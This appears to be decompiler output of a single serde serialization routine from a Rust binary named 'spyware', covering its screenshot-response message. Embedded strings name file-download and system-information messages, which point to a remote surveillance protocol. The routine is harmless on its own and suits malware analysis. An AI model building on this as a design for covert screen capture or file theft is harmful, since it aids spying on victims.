long long spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetScreenshotResponse>::serialize(struct_0 *a0, unsigned long long a1, unsigned long long a2)
{
    char v0;  // [bp-0x50], Other Possible Types: unsigned int
    unsigned int v1;  // [bp-0x4c]
    unsigned long v2;  // [bp-0x48], Other Possible Types: unsigned long long
    char v3;  // [bp-0x40]
    char v4;  // [bp-0x3f]
    int v5;  // [bp-0x30]
    unsigned long long v6;  // [bp-0x20]
    char v7;  // [bp-0x18]
    int v9;  // xmm0
    int v10;  // xmm1

    v0.serialize_struct(a2, "GetScreenshotResponsedisplays_screenshotsMessage", 21, 2);
    if (v0 != 33)
    {
        *((void*)&a0->field_11[15]) = v5;
        *((int128_t *)&a0->field_11[0]) = *((int128_t *)&v4);
        *((unsigned int *)&a0->field_0) = v0;
        *((unsigned int *)&a0->padding_1[3]) = v1;
        *((unsigned long *)&a0->padding_1[7]) = v2;
        a0->field_10 = v3;
        return a0;
    }
    v6 = v2;
    v7 = v3;
    v0.serialize_field(&v6, "displays_screenshotsMessage", 20, a1);
    if (v0 == 33)
    {
        v0.serialize_field(&v6, "error_infoDownloadFileRequestDownloadFileResponsefile_dataGetBasicInfoRequestplaceholderOperatingSystemWindowsLinuxFreeBSDMacOSIOSAndroidUnknownArchitecturex86x86_64powerpcpowerpc64armaarch64PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperati", 10, a1 + 24);
        if (v0 == 33)
        {
            a0.end(v6, v7);
            return a0;
        }
    }
    v9 = *((int128_t *)&v0);
    v10 = *((int128_t *)&v3);
    *((void*)&a0->field_11[15]) = v5;
    *((void*)&a0->field_10) = v10;
    *((void*)&a0->field_0) = v9;
    return a0;
}
